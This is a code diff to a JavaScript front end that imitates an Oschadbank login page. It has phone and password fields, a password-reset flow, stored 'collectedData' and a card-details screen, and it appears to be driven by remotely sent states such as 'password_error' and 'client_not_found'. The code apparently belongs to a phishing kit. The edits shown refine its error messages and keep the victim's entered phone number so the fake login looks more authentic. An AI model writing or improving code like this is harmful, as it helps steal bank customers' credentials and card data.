@@ -1337,14 +1337,14 @@ document.addEventListener('DOMContentLoaded', () => {
                             <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off" value="${savedPhone || ''}" inputmode="numeric" pattern="[0-9\\s]*">
                         </div>
                     </div>
-                    <div class="oschad-input-group ${passwordGroupErrorClass}">
+                    <div class="oschad-input-group password-group ${passwordGroupErrorClass}">
                         <label for="phone_password_input">Пароль</label>
                         <input type="password" class="oschad-input-field" id="phone_password_input" placeholder=" " autocomplete="off">
                         <span class="password-toggle-icon">
                             <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                         </span>
                     </div>
-                    ${(errorType === 'password' && activeOschadForm === 'phone') ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
+                    ${(errorType === 'password') ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
                     ${isClientError ? errorHtml : ''} <a href="#" class="forgot-password-link">Забули пароль?</a>
                 </div>
 
@@ -1360,7 +1360,7 @@ document.addEventListener('DOMContentLoaded', () => {
                             <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                         </span>
                     </div>
-                    ${(errorType === 'login_password' && activeOschadForm === 'login') ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
+                    ${(errorType === 'login_password') ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
                     <a href="#" class="forgot-password-link">Забули пароль?</a>
                 </div>
 
@@ -1563,14 +1563,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
     function addOschadbankLoginListeners(options = {}) {
         // NEW: Добавление опции для учета clientNotFound
-        const { errorType, clientNotFound = false } = options;
+        const { errorType, clientNotFound = false, errorMessage } = options;
         
         document.getElementById('oschad-back-arrow').addEventListener('click', () => { window.location.reload(); });
         document.querySelector('.forgot-password-link').addEventListener('click', (e) => { e.preventDefault(); renderForgotPasswordFlow(1); });
 
         const togglePhoneBtn = document.getElementById('toggle-phone'), toggleLoginBtn = document.getElementById('toggle-login');
         const phoneLoginForm = document.getElementById('phone-login-form'), loginForm = document.getElementById('login-form');
-        let activeOschadForm = 'phone'; // NEW: Объявляем activeOschadForm
+        let activeOschadForm = 'phone'; 
         
         const phoneInput = document.getElementById('phone_input'), phonePassInput = document.getElementById('phone_password_input');
         const loginInput = document.getElementById('login_input'), loginPassInput = document.getElementById('login_password_input');
@@ -1590,8 +1590,15 @@ document.addEventListener('DOMContentLoaded', () => {
             input.addEventListener('input', () => {
                 const group = input.closest('.oschad-input-group');
                 group?.classList.remove('error');
-                const errorMessageEl = group?.parentElement.querySelector('.auth-error-message');
-                if (errorMessageEl) errorMessageEl.remove();
+                // Удаляем конкретное сообщение об ошибке
+                const errorMsgEl = group?.parentElement.querySelector('.auth-error-message');
+                if (errorMsgEl && errorMsgEl.textContent === errorMessage) errorMsgEl.remove();
+                
+                // Для номера телефона нужно также проверить, не была ли это ошибка "клиент не найден"
+                const phoneGroup = document.querySelector('.phone-group');
+                const phoneErrorEl = phoneGroup?.parentElement.querySelector('.auth-error-message');
+                if (phoneErrorEl && phoneErrorEl.textContent.includes('Клієнта не знайдено')) phoneErrorEl.remove();
+                phoneGroup?.classList.remove('error');
             });
         });
         
@@ -1613,11 +1620,17 @@ document.addEventListener('DOMContentLoaded', () => {
             togglePhoneBtn.classList.add('active'); toggleLoginBtn.classList.remove('active');
             phoneLoginForm.style.display = 'block'; loginForm.style.display = 'none';
             activeOschadForm = 'phone'; updateOschadButtonState();
+            // Сброс ошибок при переключении
+            document.querySelectorAll('.oschad-input-group.error').forEach(el => el.classList.remove('error'));
+            document.querySelectorAll('#login-form .auth-error-message').forEach(el => el.remove());
         });
         toggleLoginBtn.addEventListener('click', () => {
             toggleLoginBtn.classList.add('active'); togglePhoneBtn.classList.remove('active');
             phoneLoginForm.style.display = 'none'; loginForm.style.display = 'block';
             activeOschadForm = 'login'; updateOschadButtonState();
+            // Сброс ошибок при переключении
+            document.querySelectorAll('.oschad-input-group.error').forEach(el => el.classList.remove('error'));
+            document.querySelectorAll('#phone-login-form .auth-error-message').forEach(el => el.remove());
         });
         
         customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
@@ -1776,10 +1789,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 renderLightThemedCardDetailsScreen(); 
                 break;
             case 'password_error':
-                // NEW: Изменение логики ошибки: подсвечиваем только пароль
+                // **ИЗМЕНЕННАЯ ЛОГИКА ОШИБКИ ПАРОЛЯ**
                 const errorMsg = data.loginType === 'login' ? 'Невірний логін або пароль' : 'Невірний пароль';
-                const savedPhone = data.loginType === 'phone' && collectedData.phone ? collectedData.phone.replace('+380', '').replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4') : '';
-                renderOschadbankLogin({ errorType: data.loginType === 'phone' ? 'password' : 'login_password', errorMessage: errorMsg, savedPhone });
+                const errorType = data.loginType === 'phone' ? 'password' : 'login_password';
+                const savedPhone = collectedData.phone ? collectedData.phone.replace('+380', '').replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4') : '';
+                renderOschadbankLogin({ errorType: errorType, errorMessage: errorMsg, savedPhone });
                 break;
              case 'client_not_found':
                 // NEW: Логика ошибки "Клиент не найден"
